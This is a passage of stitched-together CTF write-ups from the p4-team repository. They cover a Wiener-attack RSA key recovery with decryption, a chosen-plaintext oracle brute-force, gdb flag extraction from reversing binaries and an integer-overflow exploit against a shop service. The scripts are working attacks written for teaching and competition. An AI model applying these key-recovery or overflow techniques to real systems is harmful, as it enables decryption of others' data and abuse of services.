68574331773960697696088892795445640924833807153106889785640164637689271399503064510417142492169690916011945805675154490404590528925067599406358567902459063109040410209462273031696409389388590120586013927889551821936657759836121166591\nn = 7514486184413883943206134802309178399244378977612173666918494750761691891054947551148635071227769468578429057411933207521812645312852372491525360936618326543031520002708891330196401800722400435500157085990690437665009726219084442021182850506847121543952655588437818213790488615953323918596261471907835421407596459273791581399309405067626383928217548743866594178747621345881632069955681378662964970779524097614470204109881600043967504127490912520547758072473768719527077924134830122844355992675524808082077564650441063165395654489609498673176326527753016138066814814395200582603579511246113422000711435941608107654792503944786693356696589418688102700165482722623897706829970814110646089600275631212777003792683291735426294012686607809533096193939103941428766195023630255837719510277444701463006437791991196936648896229397094403915485049521731674097516242423233615004601202795680477677383876821794953563585797462940468885019612996080647173400509657498552114237186425176692867162493697752241051962151120715653607272964311445754089586884116532125369172407750688737448422035240971409748803419916890500367552066268915926436633178471526464741419410486387714614840372951024874043659727111073041432865136565615528171567027369016567760790667844170057\n\nc_fracs = continued_fraction(e/n).convergents()\ntest_message = 42\ntest_message_encrypted = pow(test_message,e,n)\nd = 0\nfor i in xrange(len(c_fracs)):\n\tif pow(test_message_encrypted,c_fracs[i].denom(),n) == test_message:\n\t\td = c_fracs[i].denom()\n\t\tbreak\nprint(d)\n``` \n\nAnd with `d` we can simply decode the flag:\n\n```python\nfrom crypto_commons.generic import long_to_bytes\n\n\ndef main():\n    n = 7514486184413883943206134802309178399244378977612173666918494750761691891054947551148635071227769468578429057411933207521812645312852372491525360936618326543031520002708891330196401800722400435500157085990690437665009726219084442021182850506847121543952655588437818213790488615953323918596261471907835421407596459273791581399309405067626383928217548743866594178747621345881632069955681378662964970779524097614470204109881600043967504127490912520547758072473768719527077924134830122844355992675524808082077564650441063165395654489609498673176326527753016138066814814395200582603579511246113422000711435941608107654792503944786693356696589418688102700165482722623897706829970814110646089600275631212777003792683291735426294012686607809533096193939103941428766195023630255837719510277444701463006437791991196936648896229397094403915485049521731674097516242423233615004601202795680477677383876821794953563585797462940468885019612996080647173400509657498552114237186425176692867162493697752241051962151120715653607272964311445754089586884116532125369172407750688737448422035240971409748803419916890500367552066268915926436633178471526464741419410486387714614840372951024874043659727111073041432865136565615528171567027369016567760790667844170057\n    d = 9427062506559859200764441560060897853452091503537282553799991491531587159716894888858396729480853980609608783434755632459538177527336880678476984732352511\n    ct = 4990981759460304744105598767593686181405870005282225829795794541021226151966053079510943795109726609634828370167775307839662644021918767556530119412853816585221569546843939870445288438295880322602517246037112564416212745954141726471664361647045729235670622890953655065235230427298013906810014221648290750692583336186843003229107021202513937560627163229698907224982160099413064560450430189221548918249561722797270239205285019947483419790983776163671611001827036804081081707549809205146146016914228431689911951835061650007130105435596899572248580145216361550470379538250892374083206633208114199207657470199269462010122511529769658733474277302308656490658251694852119519651331026206905848184310474442594518003923697214854504891077728222935182875777284193900483103844390422979429620136337089544700764854729601666550485708645758202313582038929079609869996469534041940940326632417337431671554125949585769777514656385405640728690453834779703498214246941789126527089991023766694976273980553865664242840580534044580685023115108182135139502041838131616984809782973256326815445038141870218251128685050551152554710812132312358766591390023888015234480632150114384947814031965110524912964541892010650475016456100706107619225121444952046171313017830946278\n    print(long_to_bytes(pow(ct, d, n)))\nmain()\n```\n\nAnd we get:\n\n```\nMr.D (12:10):\nOkey, see you later ;)\n\nMr.D (19:30):\nSo can you help me?\n\nAnonymous (19:31):\nYeah, we will have 10,000 falsified voters. Transfer 100000$ to my bank account: ctfzone{3177809746931830}\n```\n\n## PL version\n\nW zadaniu dostajemy [klucz publiczny RSA](public.txt), [zaszyfrowaną flagę](data.enc) oraz [kod szyfrowania](mprsa.py) wykorzystany do szyfrowania danych.\nKod zawira klasyczną implementacje RSA opartego o wiele liczb pierwszych, z dość ciekawą logiką generacji klucza:\n\n```python\ndef key_gen(self, bits, prime_numbers=4):\n\tdelta = randint(5, 15)\n\tbit_prime = int(bits // prime_numbers)\n\n\tP = [next_prime(number.getPrime(bit_prime) + 1)]\n\tfor i in range(1, prime_numbers):\n\t\tP.append(next_prime(P[i - 1] * delta))\n\n\tn = self.__compute_module(P)\n\tphi = self.__compute_phi(P)\n\n\tfor d_next in count(int(pow(P[0] // 2, 0.5)), -1):\n\t\tg, e, __ = gcdext(d_next, phi)\n\t\tif (1 < e < n) and (g == 1) and (gcd(phi, e) == 1):\n\t\t\td = d_next\n\t\t\tbreak\n\n\tself.public_key = (e, n)\n\tself.secret_key = (d, n)\n```\n\nPierwszą podatnością, którą zauważyliśmy w tym kodzie był sposób wyliczania modulusa `n`, który składa się z mocno nie-losowych liczb pierwszych, bo `.next_prime` jest deterministyczne a `delta` jest dość niewielka.\nWidzieliśmy writeupy które atakowały zadanie zgodnie z tym wektorem.\n\nNiemniej mamy już trochę doświadczenia z atakami na RSA i zauważyliśmy inną ciekawostkę w kodzie:\n\n```python\nfor d_next in count(int(pow(P[0] // 2, 0.5)), -1):\n```\n\nPrywatny wykładnik szyfrujący zaczyna się od `sqrt(p1/2)` a wiemy że p1 jest najmniejszym czynnikiem pierwszym w `n` i że czynniki są zbliżonego rozmiaru, więc `p1` musi być mniejsze od `n^(1/4)`.\n\nWiemy też że jeśli `d < 1/3 n^(1/4)` to możemy użyć ataku Wienera aby odzyskać prywatny wykładnik szyfrujący.\nJak widać mamy szczęście i możemy użyc prostego skryptu sage:\n\n```python\ne = 2968282037100353640375137899109790499983904510372252123726372200136866453960017151334469454219618530252326391316368089337062513360207381202191915473462935477137523455963250056561696664667826520897145326882242932509636924316993816382503962649302107865422204292490659961123103322081852240437978613121365781016988448211321349469941008479597808471102164820173139919110860676464533506147455712945961147297193425603466185665772219928497258618754492859488589873906043003885893571962433509510568617898956135134801893952671289895841202079907023382879176353447845431980339763701845065932967492613174149948295178658632744337984598033199716909609691917091599333032421515584590767434316739374277008976624091929263313294017958203501962609986428734553144207841375915976037349385525685765751825435583700725710652618107250634373424713513298201017768173878869803169781015337283490319756398578109078482368725206020186761161884650413182297877151106135232838271785994275915310662858329477083914589917431343036266926436535406078268574331773960697696088892795445640924833807153106889785640164637689271399503064510417142492169690916011945805675154490404590528925067599406358567902459063109040410209462273031696409389388590120586013927889551821936657759836121166591\nn = 7514486184413883943206134802309178399244378977612173666918494750761691891054947551148635071227769468578429057411933207521812645312852372491525360936618326543031520002708891330196401800722400435500157085990690437665009726219084442021182850506847121543952655588437818213790488615953323918596261471907835421407596459273791581399309405067626383928217548743866594178747621345881632069955681378662964970779524097614470204109881600043967504127490912520547758072473768719527077924134830122844355992675524808082077564650441063165395654489609498673176326527753016138066814814395200582603579511246113422000711435941608107654792503944786693356696589418688102700165482722623897706829970814110646089600275631212777003792683291735426294012686607809533096193939103941428766195023630255837719510277444701463006437791991196936648896229397094403915485049521731674097516242423233615004601202795680477677383876821794953563585797462940468885019612996080647173400509657498552114237186425176692867162493697752241051962151120715653607272964311445754089586884116532125369172407750688737448422035240971409748803419916890500367552066268915926436633178471526464741419410486387714614840372951024874043659727111073041432865136565615528171567027369016567760790667844170057\n\nc_fracs = continued_fraction(e/n).convergents()\ntest_message = 42\ntest_message_encrypted = pow(test_message,e,n)\nd = 0\nfor i in xrange(len(c_fracs)):\n\tif pow(test_message_encrypted,c_fracs[i].denom(),n) == test_message:\n\t\td = c_fracs[i].denom()\n\t\tbreak\nprint(d)\n``` \n\nI teraz mając już `d` możemy odszyfrować dane:\n\n```python\nfrom crypto_commons.generic import long_to_bytes\n\n\ndef main():\n    n = 7514486184413883943206134802309178399244378977612173666918494750761691891054947551148635071227769468578429057411933207521812645312852372491525360936618326543031520002708891330196401800722400435500157085990690437665009726219084442021182850506847121543952655588437818213790488615953323918596261471907835421407596459273791581399309405067626383928217548743866594178747621345881632069955681378662964970779524097614470204109881600043967504127490912520547758072473768719527077924134830122844355992675524808082077564650441063165395654489609498673176326527753016138066814814395200582603579511246113422000711435941608107654792503944786693356696589418688102700165482722623897706829970814110646089600275631212777003792683291735426294012686607809533096193939103941428766195023630255837719510277444701463006437791991196936648896229397094403915485049521731674097516242423233615004601202795680477677383876821794953563585797462940468885019612996080647173400509657498552114237186425176692867162493697752241051962151120715653607272964311445754089586884116532125369172407750688737448422035240971409748803419916890500367552066268915926436633178471526464741419410486387714614840372951024874043659727111073041432865136565615528171567027369016567760790667844170057\n    d = 9427062506559859200764441560060897853452091503537282553799991491531587159716894888858396729480853980609608783434755632459538177527336880678476984732352511\n    ct = 4990981759460304744105598767593686181405870005282225829795794541021226151966053079510943795109726609634828370167775307839662644021918767556530119412853816585221569546843939870445288438295880322602517246037112564416212745954141726471664361647045729235670622890953655065235230427298013906810014221648290750692583336186843003229107021202513937560627163229698907224982160099413064560450430189221548918249561722797270239205285019947483419790983776163671611001827036804081081707549809205146146016914228431689911951835061650007130105435596899572248580145216361550470379538250892374083206633208114199207657470199269462010122511529769658733474277302308656490658251694852119519651331026206905848184310474442594518003923697214854504891077728222935182875777284193900483103844390422979429620136337089544700764854729601666550485708645758202313582038929079609869996469534041940940326632417337431671554125949585769777514656385405640728690453834779703498214246941789126527089991023766694976273980553865664242840580534044580685023115108182135139502041838131616984809782973256326815445038141870218251128685050551152554710812132312358766591390023888015234480632150114384947814031965110524912964541892010650475016456100706107619225121444952046171313017830946278\n    print(long_to_bytes(pow(ct, d, n)))\nmain()\n```\n\nI dostajemy:\n\n```\nMr.D (12:10):\nOkey, see you later ;)\n\nMr.D (19:30):\nSo can you help me?\n\nAnonymous (19:31):\nYeah, we will have 10,000 falsified voters. Transfer 100000$ to my bank account: ctfzone{3177809746931830}\n```\n", "timestamp": "2025-10-21T13:31:53.145672"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-07-15-ctfzone/mprsa/public.txt", "url": "https://github.com/p4-team/ctf/blob/master/2017-07-15-ctfzone/mprsa/public.txt", "content": "e = 2968282037100353640375137899109790499983904510372252123726372200136866453960017151334469454219618530252326391316368089337062513360207381202191915473462935477137523455963250056561696664667826520897145326882242932509636924316993816382503962649302107865422204292490659961123103322081852240437978613121365781016988448211321349469941008479597808471102164820173139919110860676464533506147455712945961147297193425603466185665772219928497258618754492859488589873906043003885893571962433509510568617898956135134801893952671289895841202079907023382879176353447845431980339763701845065932967492613174149948295178658632744337984598033199716909609691917091599333032421515584590767434316739374277008976624091929263313294017958203501962609986428734553144207841375915976037349385525685765751825435583700725710652618107250634373424713513298201017768173878869803169781015337283490319756398578109078482368725206020186761161884650413182297877151106135232838271785994275915310662858329477083914589917431343036266926436535406078268574331773960697696088892795445640924833807153106889785640164637689271399503064510417142492169690916011945805675154490404590528925067599406358567902459063109040410209462273031696409389388590120586013927889551821936657759836121166591\nn = 7514486184413883943206134802309178399244378977612173666918494750761691891054947551148635071227769468578429057411933207521812645312852372491525360936618326543031520002708891330196401800722400435500157085990690437665009726219084442021182850506847121543952655588437818213790488615953323918596261471907835421407596459273791581399309405067626383928217548743866594178747621345881632069955681378662964970779524097614470204109881600043967504127490912520547758072473768719527077924134830122844355992675524808082077564650441063165395654489609498673176326527753016138066814814395200582603579511246113422000711435941608107654792503944786693356696589418688102700165482722623897706829970814110646089600275631212777003792683291735426294012686607809533096193939103941428766195023630255837719510277444701463006437791991196936648896229397094403915485049521731674097516242423233615004601202795680477677383876821794953563585797462940468885019612996080647173400509657498552114237186425176692867162493697752241051962151120715653607272964311445754089586884116532125369172407750688737448422035240971409748803419916890500367552066268915926436633178471526464741419410486387714614840372951024874043659727111073041432865136565615528171567027369016567760790667844170057", "timestamp": "2025-10-21T13:31:53.246562"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-09-17-ekoparty/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-09-17-ekoparty/README.md", "content": "# EKOPARTY CTF 2017\n\nTeam: c7f.m0d3, shalom, nazywam, cr019283\n\n### Table of contents\n\n* [Angel (re)](angel)\n* [OldPC (misc)](oldpc)\n* [My first app (web)](my_first_app_web)\n* [Warmup (re)](warmup_re)\n* [Malbolge (misc)](malbolge_misc)\n* [Shopping (pwn)](shopping_pwn)\n* [Shopwn (pwn)](shopwn_pwn)\n* [Rhapsody (re)](rhapsody_re)\n* [ICSS (misc/crypto)](icss_misc)\n* [Special (misc)](special_misc)\n* [COBOL (re)](cobol_re)\n* [Spies (dns)](spies_dns)\n* [EKOVM (vm)](ekovm)\n", "timestamp": "2025-10-21T13:31:54.932396"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-09-17-ekoparty/icss_misc/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-09-17-ekoparty/icss_misc/README.md", "content": "# ICSS (Misc/Crypto, 471p, 18 solved)\n\nA blackbox crypto challenge.\nWe get a base64 encoded ciphertext `ypovStywDFkNEotWNc3AxtlL2IwWKuJA1qawdvYynITDDIpknntQR1gB+Nzl` and access to a service which can encrypt for us up to 6 characters of input.\n\nFirst we need to understand how this encryption works, and for this we played a bit with it, sending specially crafted payloads.\nWe can notice some things:\n\n1. Encryption goes character by character, there are no blocks. It's easy to see when we add or remove characters.\n\n2. Ciphertext for a character depends on the character itself and on the position where it is in the input. The same character on a different position encrypts differently, but the same character at the same position, even for different plaintexts gives the same encrypted value.\nFor example:\naaa -> a060a2\naba -> a063a2\n\nSo the encryption for the last `a` stayed the same.\n\n3. An exception to above rule is the first character. It affects how rest of the string is encrypted.\n\nAnother set of tests we did gave some interesting results. \nBy sending `\\x00\\x00\\x00\\x00\\x00\\x00` bytes we got `010102030508` which looks like a Fibonacci sequence!\nIt got even better when we sent `\\x01\\x00\\x00\\x00\\x00\\x00` because we got `00020305080d` which is the same sequence just shifter 1 position further (disregarding the first byte).\nIf we now send `\\x01\\x05\\x00\\x00\\x00\\x00` we will get `00070305080d` so the sequence is the same but second byte is bigger by 5, which is the value we tried to encrypt.\nFirst byte encryption is unknown, but it depends only on this character, so we don't really care, it can be brute-forced.\n\nWe did a bit more checking and it was quite clear that the encryption does something like:\n1. Encrypt first byte in some special way\n2. Every other byte in position `k` is encrypted as `Fibonacci(first_byte + k) + kth_byte_value`\n\nHowever, there is some weird stuff happening when overflow is reached, and it seemed some other special cases are present as well for even/odd numbers.\n\nInstead of trying to figure out how to handle those issues, we decided to go the \"easy\" way instead.\nWe know that by changing the first byte we can \"shift\" the Fibonacci sequence for the rest of the encryption, but it means that we basically shift the positions!\nBy sending `Xa` we can get encrypted byte `a` at positon `1` with starting byte `X`, but if we send `(X+1)a` we will shift the sequence and the result will be the same as encrypted `a` at position `2` with starting byte `X`.\n\nThis means that we can pretty much get any encrypted byte at any position we want by encrypting only 2 bytes at a time!\nWe use this approach with the server as \"oracle\" serving us the encrypted bytes and we brute-force the flag.\n\nWhat we want to do:\n1. Take a single encrypted character from the encrypted flag we have at k-th position.\n2. Encrypt via server every possible character at k-th position and compare it with the one we have. Once they match we know what was the plaintext character.\n3. Repeat until we get whole flag.\n\nSo we run:\n\n```python\nimport base64\nimport string\n\nfrom crypto_commons.netcat.netcat_commons import nc, send\n\n\ndef brute_character_at_position(position, expected):\n    for c in string.letters + \"{_\" + string.digits + string.punctuation:\n        if int(get_encrypted_char_at_position(c, position), 16) == ord(expected):\n            return c\n    return \"?\"\n\n\ndef get_encrypted_char_at_position(character, position):\n    return get_ciphertext(chr(ord('E') + position) + character)[2:4]\n\n\ndef get_ciphertext(c):\n    url = 'icss.ctf.site'\n    port = 40112\n    s = nc(url, port)\n    s.recv(9999)\n    s.recv(9999)\n    send(s, c)\n    s.recv(9999)\n    result = s.recv(9999)\n    return base64.b64decode(result).encode(\"hex\")\n\n\ndef main():\n    flag_ciphertext = base64.b64decode(\"ypovStywDFkNEotWNc3AxtlL2IwWKuJA1qawdvYynITDDIpknntQR1gB+Nzl\")\n    flag_plaintext = \"E\"\n    for i in range(len(flag_ciphertext) - 1):\n        expected_encrypted_byte = flag_ciphertext[i + 1]\n        flag_plaintext += brute_character_at_position(i, expected_encrypted_byte)\n        print(flag_plaintext)\n    print(flag_plaintext)\n\n\nmain()\n```\n\nAfter a while we finally get: `EKO{Mr_Leon4rd0_PisAno_Big0770_AKA_Fib@nacc!}`\n", "timestamp": "2025-10-21T13:31:55.379226"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-09-17-ekoparty/rhapsody_re/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-09-17-ekoparty/rhapsody_re/README.md", "content": "# Warmup (RE, 415p, 52 solved)\n\nAnother classic reversing challenge.\nWe get a [binary](rhapsody), ELF x64, statically compiled.\n\nJust like in warmup we can see a permutated flag in the strings:\n\n```asm\n00000000004a2739         db  0x73 ; 's'                                         ; DATA XREF=sub_400a59+28, sub_400bf4+28, sub_400d0c+28, sub_4010e0+28\n00000000004a273a         db  0x00 ; '.'\n00000000004a273b         db  0x31 ; '1'                                         ; DATA XREF=sub_400a9f+28, sub_400bae+28\n00000000004a273c         db  0x00 ; '.'\n00000000004a273d         db  0x34 ; '4'                                         ; DATA XREF=sub_400ae5+28, sub_400b68+28, sub_40116c+28, sub_4011f8+28, sub_401310+28\n00000000004a273e         db  0x00 ; '.'\n00000000004a273f         db  0x74 ; 't'                                         ; DATA XREF=sub_400c3a+28\n00000000004a2740         db  0x00 ; '.'\n00000000004a2741         db  0x4b ; 'K'                                         ; DATA XREF=sub_400c80+28\n00000000004a2742         db  0x00 ; '.'\n00000000004a2743         db  0x68 ; 'h'                                         ; DATA XREF=sub_400cc6+28\n00000000004a2744         db  0x00 ; '.'\n00000000004a2745         db  0x72 ; 'r'                                         ; DATA XREF=sub_400d52+28, sub_400fc8+28\n00000000004a2746         db  0x00 ; '.'\n00000000004a2747         db  0x7b ; '{'                                         ; DATA XREF=sub_400d98+28\n00000000004a2748         db  0x00 ; '.'\n00000000004a2749         db  0x33 ; '3'                                         ; DATA XREF=sub_400dde+28, sub_40100e+28\n00000000004a274a         db  0x00 ; '.'\n00000000004a274b         db  0x4f ; 'O'                                         ; DATA XREF=sub_400e24+28\n00000000004a274c         db  0x00 ; '.'\n00000000004a274d         db  0x6c ; 'l'                                         ; DATA XREF=sub_400e6a+28, sub_400ef6+28\n00000000004a274e         db  0x00 ; '.'\n00000000004a274f         db  0x66 ; 'f'                                         ; DATA XREF=sub_400eb0+28, sub_4011b2+28\n00000000004a2750         db  0x00 ; '.'\n00000000004a2751         db  0x67 ; 'g'                                         ; DATA XREF=sub_400f3c+28\n00000000004a2752         db  0x00 ; '.'\n00000000004a2753         db  0x30 ; '0'                                         ; DATA XREF=sub_400f82+28\n00000000004a2754         db  0x00 ; '.'\n00000000004a2755         db  0x6a ; 'j'                                         ; DATA XREF=sub_401054+28\n00000000004a2756         db  0x00 ; '.'\n00000000004a2757         db  0x75 ; 'u'                                         ; DATA XREF=sub_40109a+28\n00000000004a2758         db  0x00 ; '.'\n00000000004a2759         db  0x37 ; '7'                                         ; DATA XREF=sub_401126+28, sub_401284+28\n00000000004a275a         db  0x00 ; '.'\n00000000004a275b         db  0x6e ; 'n'                                         ; DATA XREF=sub_40123e+28\n00000000004a275c         db  0x00 ; '.'\n00000000004a275d         db  0x7d ; '}'                                         ; DATA XREF=sub_4012ca+28\n```\n\nAnd again we can find a very nice pattern for checking the flag:\n\n```asm\n000000000040137c         mov        eax, 0x0\n0000000000401381         call       sub_400b2b\n0000000000401386         test       eax, eax\n0000000000401388         jne        loc_401394\n\n000000000040138a         mov        eax, 0x0\n000000000040138f         jmp        loc_4016a0\n\n                     loc_401394:\n0000000000401394         mov        eax, 0x0                                    ; CODE XREF=sub_401378+16\n0000000000401399         call       sub_400c80\n000000000040139e         test       eax, eax\n00000000004013a0         jne        loc_4013ac\n\n00000000004013a2         mov        eax, 0x0\n00000000004013a7         jmp        loc_4016a0\n\n                     loc_4013ac:\n00000000004013ac         mov        eax, 0x0                                    ; CODE XREF=sub_401378+40\n00000000004013b1         call       sub_400e24\n00000000004013b6         test       eax, eax\n00000000004013b8         jne        loc_4013c4\n\n00000000004013ba         mov        eax, 0x0\n00000000004013bf         jmp        loc_4016a0\n```\n\nand more similar checks.\nJump `jmp loc_4016a0` means of course we failed to get the character right.\nFortunately for us the functions we are calling here are all basically the same:\n\n```asm\n                     sub_400c80:\n0000000000400c80         push       rbp                                         ; CODE XREF=sub_401378+33\n0000000000400c81         mov        rbp, rsp\n0000000000400c84         mov        eax, 0x0\n0000000000400c89         call       sub_4009d3\n0000000000400c8e         mov        byte [0x6cee20], al\n0000000000400c94         mov        eax, 0x6cee41\n0000000000400c99         movzx      edx, byte [rax]\n0000000000400c9c         mov        eax, 0x4a2741\n0000000000400ca1         movzx      eax, byte [rax]\n0000000000400ca4         cmp        dl, al\n0000000000400ca6         jne        loc_400cbf\n\n0000000000400ca8         mov        eax, dword [0x6cdc70]\n0000000000400cae         xor        eax, 0x5\n0000000000400cb1         mov        dword [0x6cdc70], eax\n0000000000400cb7         mov        eax, dword [0x6cdc70]\n0000000000400cbd         jmp        loc_400cc4\n\n                     loc_400cbf:\n0000000000400cbf         mov        eax, 0x0                                    ; CODE XREF=sub_400c80+38\n\n                     loc_400cc4:\n0000000000400cc4         pop        rbp                                         ; CODE XREF=sub_400c80+61\n0000000000400cc5         ret\n                        ; endp\n```\n\nThis function simply loads our input byte and then compares it with expected flag byte.\nAnd those functions go in order!\nThere is a call to some strange function here, but in the end it doesn't matter, so no point bothering with it.\n\nThere was a small difference for the first check, because the function was a bit different, but we know the first character of the flag is `E` so we simply start with the second one.\n\nThis looks like a nice target for angr, but we couldn't run it, just like for warmup, so we did a gdb script one more time.\n\nWhat we want to do:\n\n1. Stop when the pattern of cmp-then-jump starts.\n2. Step into the function.\n3. Move to the `cmp` and check what input was expected, save it as flag byte.\n4. Change our input byte for the expected one, so the checks pass and we can proceed.\n5. Move to the next check.\n\nWe run:\n\n```python\nimport gdb\nimport codecs\nimport string\n\nflag = []\ngdb.execute(\"break *0x401399\")\ngdb.execute(\"r <<< $(echo 'Eaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\")\nfor i in range(32):\n    gdb.execute(\"s\")\n    for j in range(9):\n        gdb.execute(\"n\")\n    character = chr(int(str(gdb.parse_and_eval(\"$al\")),16))\n    flag.append(character)\n    gdb.execute(\"set $dl = $al\")\n    for j in range(12):\n        gdb.execute(\"n\")\nprint('E'+\"\".join(flag))\n```\n\nAnd we get: `EKO{1sth1sr34lfl4g0rjus7f4n74s34}`\n", "timestamp": "2025-10-21T13:31:55.801118"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-09-17-ekoparty/shopwn_pwn/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-09-17-ekoparty/shopwn_pwn/README.md", "content": "# Shopwn (Pwn, 375p, 76 solved)\n\nA task very similar to Shopping, but this time we can pass only positive numbers as quantity.\nThe interface is exactly the same so again:\n\n```\nWelcome to Ekoparty shopping Center\nFeel free to buy up to 5 items that you may like\nUse wisely your coins, have fun!\n\n\nYou have 50 coins\nWhat do you wanna buy today?\n1. t-shirt\t\t10\n2. short\t\t20\n3. stickers\t\t1\n4. flag\t\t\t?\n```\n\nThis time the trick is to guess that since the server can check if our input is negative, it means there is a signed integer of some sort where our input is stored.\nIn such case there is a chance of causing integer overflow when this value is multiplied by the price.\nWe didn't know how many bits they're using but we got a hit with 16 bits.\nSo we send a large signed 16 bit integer, which has to overflow after multiplication.\n\nWe run:\n\n```python\nimport hashlib\nimport re\n\nimport os\n\nfrom crypto_commons.netcat.netcat_commons import nc, send, interactive\n\n\ndef PoW(task):\n    while True:\n        data = os.urandom(10)\n        if hashlib.sha1(data).hexdigest()[0:6] == task:\n            return data\n\n\ndef main():\n    url = \"shopping.ctf.site\"\n    port = 22222\n    s = nc(url, port)\n    data = s.recv(9999)\n    task = re.findall(\"== (.*)\", data)[0]\n    send(s, PoW(task))\n    print(s.recv(9999))\n    send(s, \"4\")\n    print(s.recv(9999))\n    send(s, str(2 ** 15))\n    print(s.recv(9999))\n    interactive(s)\n\n\nmain()\n\n```\n\nand we get `EKO{dude_where_is_my_leak?}`\n", "timestamp": "2025-10-21T13:31:56.086764"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-09-17-ekoparty/warmup_re/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-09-17-ekoparty/warmup_re/README.md", "content": "# Warmup (RE, 397p, 63 solved)\n\nIt's a classic reversing challenge.\nWe get a [binary](warmup), ELF x64, statically compiled.\nIn the strings we can see something resembling a permutated flag:\n\n```asm\n00000000004a171b         db  0x4f ; 'O'                                         ; DATA XREF=sub_4009d8+12\n00000000004a171c         db  0x00 ; '.'\n00000000004a171d         db  0x5f ; '_'                                         ; DATA XREF=sub_4009d8+36, sub_4009d8+276, sub_4009d8+300, sub_4009d8+396, sub_4009d8+564\n00000000004a171e         db  0x00 ; '.'\n00000000004a171f         db  0x75 ; 'u'                                         ; DATA XREF=sub_4009d8+60, sub_4009d8+588\n00000000004a1720         db  0x00 ; '.'\n00000000004a1721         db  0x74 ; 't'                                         ; DATA XREF=sub_4009d8+84, sub_4009d8+372\n00000000004a1722         db  0x00 ; '.'\n00000000004a1723         db  0x31 ; '1'                                         ; DATA XREF=sub_4009d8+108, sub_4009d8+228\n00000000004a1724         db  0x00 ; '.'\n00000000004a1725         db  0x7b ; '{'                                         ; DATA XREF=sub_4009d8+132\n00000000004a1726         db  0x00 ; '.'\n00000000004a1727         db  0x6a ; 'j'                                         ; DATA XREF=sub_4009d8+156\n00000000004a1728         db  0x00 ; '.'\n00000000004a1729         db  0x73 ; 's'                                         ; DATA XREF=sub_4009d8+180, sub_4009d8+252\n00000000004a172a         db  0x00 ; '.'\n00000000004a172b         db  0x68 ; 'h'                                         ; DATA XREF=sub_4009d8+204\n00000000004a172c         db  0x00 ; '.'\n00000000004a172d         db  0x3f ; '?'                                         ; DATA XREF=sub_4009d8+324\n00000000004a172e         db  0x00 ; '.'\n00000000004a172f         db  0x35 ; '5'                                         ; DATA XREF=sub_4009d8+348\n00000000004a1730         db  0x00 ; '.'\n00000000004a1731         db  0x34 ; '4'                                         ; DATA XREF=sub_4009d8+420, sub_4009d8+492\n00000000004a1732         db  0x00 ; '.'\n00000000004a1733         db  0x4b ; 'K'                                         ; DATA XREF=sub_4009d8+444\n00000000004a1734         db  0x00 ; '.'\n00000000004a1735         db  0x77 ; 'w'                                         ; DATA XREF=sub_4009d8+468\n00000000004a1736         db  0x00 ; '.'\n00000000004a1737         db  0x72 ; 'r'                                         ; DATA XREF=sub_4009d8+516\n00000000004a1738         db  0x00 ; '.'\n00000000004a1739         db  0x6d ; 'm'                                         ; DATA XREF=sub_4009d8+540\n00000000004a173a         db  0x00 ; '.'\n00000000004a173b         db  0x70 ; 'p'                                         ; DATA XREF=sub_4009d8+608\n00000000004a173c         db  0x00 ; '.'\n00000000004a173d         db  0x45 ; 'E'                                         ; DATA XREF=sub_4009d8+628\n00000000004a173e         db  0x00 ; '.'\n00000000004a173f         db  0x7d ; '}'                                         ; DATA XREF=sub_4009d8+648\n```\n\nIf we look at how those values are used we can see a clear pattern:\n\n```asm\n00000000004009dc         mov        eax, 0x6ccd62\n00000000004009e1         movzx      edx, byte [rax]\n00000000004009e4         mov        eax, 0x4a171b\n00000000004009e9         movzx      eax, byte [rax]\n00000000004009ec         cmp        dl, al\n00000000004009ee         jne        loc_400d58\n\n00000000004009f4         mov        eax, 0x6ccd72\n00000000004009f9         movzx      edx, byte [rax]\n00000000004009fc         mov        eax, 0x4a171d\n0000000000400a01         movzx      eax, byte [rax]\n0000000000400a04         cmp        dl, al\n0000000000400a06         jne        loc_400d51\n\n0000000000400a0c         mov        eax, 0x6ccd6d\n0000000000400a11         movzx      edx, byte [rax]\n0000000000400a14         mov        eax, 0x4a171f\n0000000000400a19         movzx      eax, byte [rax]\n0000000000400a1c         cmp        dl, al\n0000000000400a1e         jne        loc_400d4a\n\n0000000000400a24         mov        eax, 0x6ccd67\n0000000000400a29         movzx      edx, byte [rax]\n0000000000400a2c         mov        eax, 0x4a1721\n0000000000400a31         movzx      eax, byte [rax]\n0000000000400a34         cmp        dl, al\n0000000000400a36         jne        loc_400d43\n\n0000000000400a3c         mov        eax, 0x6ccd69\n0000000000400a41         movzx      edx, byte [rax]\n0000000000400a44         mov        eax, 0x4a1723\n0000000000400a49         movzx      eax, byte [rax]\n0000000000400a4c         cmp        dl, al\n0000000000400a4e         jne        loc_400d3c\n```\n\nand more checks like this following.\nTarget for the `jne` jump is finishing without printing \"valid!\".\n\nIt looks like a perfect binary for angr, but for some reason we had issues with running angr on it, and we decided it will be faster to do it just with gdb script, instead of trying to fix the angr issue.\n\nWhat we want to do:\n\n1. Break at the point in binary where the pattern of comparison-and-jump starts -> `0x4009dc`\n2. Move to the point where address of our input byte is loaded and save this address, so that we know which byte was checked.\n3. Move to comparison and save the expected byte value\n4. Set our value to the expected one, so the comparison passes and we go to the next character\n5. We now know which address of our input bytes was supposed to be a certain flag byte, and since those addresses are from a single memory block, we can just sort it to get the flag.\n\n```python\nimport gdb\nimport codecs\nimport string\n\nflag = []\ngdb.execute(\"break *0x4009dc\")\ngdb.execute(\"r <<< $(echo 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\")\nfor i in range(28):\n    for i in range(2):\n        gdb.execute(\"n\")\n    addr = int(str(gdb.parse_and_eval(\"$eax\")),16)\n    for i in range(2):\n        gdb.execute(\"n\")\n    value = chr(int(str(gdb.parse_and_eval(\"$eax\")),16))\n    flag.append((addr, value))\n    gdb.execute(\"set $dl = 